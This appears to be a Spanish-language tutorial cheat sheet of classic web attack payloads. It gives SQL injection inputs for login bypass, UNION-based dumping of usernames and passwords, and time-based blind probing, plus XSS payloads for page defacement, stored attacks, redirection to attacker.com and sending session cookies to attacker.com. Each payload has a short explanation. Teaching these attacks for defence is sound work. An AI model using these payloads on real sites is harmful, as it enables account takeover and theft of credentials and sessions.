SQL INJECTION

1. Bypass de Autenticación
Este es el ejemplo más común para demostrar SQL Injection. Se utiliza una consulta que siempre será verdadera, permitiendo al atacante evitar el proceso de autenticación.

Entrada del formulario:

- Usuario: ' OR '1'='1'; -- 
- Contraseña: (deja en blanco)

Explicación: El atacante aprovecha el operador OR para hacer que la condición de autenticación sea siempre verdadera.'

2. Extracción de Datos de la Base de Datos
El atacante puede intentar extraer datos sensibles directamente de la base de datos con un ataque de Union-based SQL Injection.

Entrada del formulario:

Usuario: ' UNION SELECT null, username, password FROM users; -- 
Contraseña: (cualquier valor)

Explicación: Con el uso de UNION, el atacante puede combinar la consulta original con otra que extrae datos sensibles, como nombres de usuario y contraseñas.

3. Ataque de Tiempo Basado (Blind SQL Injection)
Si no hay mensajes de error visibles, el atacante puede realizar un ataque de inyección SQL basado en el tiempo para confirmar si una consulta es verdadera o falsa.

Entrada del formulario:

Usuario: ' OR IF(1=1, SLEEP(5), 0) -- 
Contraseña: (cualquier valor)

Explicación: Si la condición es verdadera (1=1), el servidor se retrasará 5 segundos antes de responder, lo que indica al atacante que la inyección fue exitosa. Esto es útil en ataques de Blind SQL Injection donde el atacante no recibe retroalimentación directa.

XSS

1. Inyección de Script Simple
Este es el ejemplo más básico de un ataque XSS.

Entrada del formulario:<script>alert('XSS');</script>

Explicación: Este ataque inyecta un script que muestra un cuadro de alerta. Es el ataque de XSS más simple y demuestra cómo los scripts pueden ejecutarse si no se escapan correctamente.

2. Robar Cookies del Usuario
El atacante puede intentar robar cookies de sesión del usuario a través de XSS.

Entrada del formulario: <script>document.write('<img src="http://attacker.com/cookie?cookie=' + document.cookie + '">');</script>

Explicación: Este código envía las cookies del usuario a un servidor externo controlado por el atacante. Demuestra cómo un atacante puede obtener información sensible como tokens de sesión.

3. Inyección de HTML y Manipulación del DOM
El atacante puede inyectar HTML para alterar el contenido visual de la página o manipular el DOM.

Entrada del formulario:<script>document.body.innerHTML = '<h1>Esta página ha sido hackeada</h1>';</script>

Explicación: En este caso, el script modifica todo el contenido de la página, mostrando un mensaje personalizado del atacante. Esto demuestra cómo un atacante puede alterar la experiencia visual del usuario.

4. Redirección Maliciosa
El atacante puede redirigir a los usuarios a sitios web maliciosos sin su conocimiento.

Entrada del formulario:<script>window.location='http://attacker.com';</script>

Explicación: Este ataque redirige al usuario automáticamente a un sitio web controlado por el atacante, lo que podría ser una página de phishing o un sitio con malware.

5. Ataque de XSS Persistente
Si los comentarios se guardan en la base de datos y se muestran a otros usuarios, un atacante puede inyectar un script que afecte a todos los que visiten la página.

Entrada del formulario:<script>alert('Este script afectará a todos los que vean este comentario');</script>

Explicación: En un ataque XSS persistente, el script inyectado se almacena en la base de datos y se ejecuta cada vez que la página que lo contiene es cargada por otros usuarios. Esto tiene un impacto más amplio, ya que afecta a varios usuarios.